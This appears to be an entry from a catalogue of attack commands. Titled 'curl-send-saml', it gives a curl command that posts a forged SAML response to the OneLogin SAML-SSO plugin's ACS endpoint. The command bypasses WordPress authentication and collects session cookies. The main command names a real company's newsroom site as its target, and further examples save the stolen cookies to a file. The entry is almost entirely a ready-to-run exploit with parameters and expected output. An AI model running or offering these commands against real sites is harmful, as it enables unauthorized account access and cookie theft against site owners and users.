---
data: >-
  curl -v
  'https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs'
  --data "RelayState=/wp-login.php" --data-urlencode "SAMLResponse=$xml"
tags:
  - http
  - saml
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:43.187Z'
id: 62ddc059-1e0c-4345-9491-4a57ef6e2ec4
verified: false
validated: true
submitted: true
---
# curl-send-saml

## Command

```bash
curl -v 'https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs' --data "RelayState=/wp-login.php" --data-urlencode "SAMLResponse=$xml"
```

## Description

This command sends a POST request with a forged base64-encoded SAML response to the OneLogin SAML-SSO ACS endpoint, exploiting the auth bypass to obtain authentication cookies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose mode to show headers | Yes |
| URL | Target ACS endpoint | Yes |
| `--data "RelayState=/wp-login.php"` | Redirect URI after auth | Yes |
| `--data-urlencode "SAMLResponse=$xml"` | Encoded SAML response variable | Yes |

## Examples

### Basic Usage

```bash
curl -v 'https://target.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs' --data "RelayState=/wp-login.php" --data-urlencode "SAMLResponse=$xml"
```

### Advanced Usage

With cookie jar for saving:

```bash
curl -v -c cookies.txt 'https://target.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs' --data "RelayState=/wp-login.php" --data-urlencode "SAMLResponse=$xml"
```

## Expected Output

Verbose HTTP exchange ending in 302 Found, with Set-Cookie headers for WordPress auth cookies and Location redirect to the site.

## Related

- [[Related Procedure: Send-Forged-SAML-Response]]
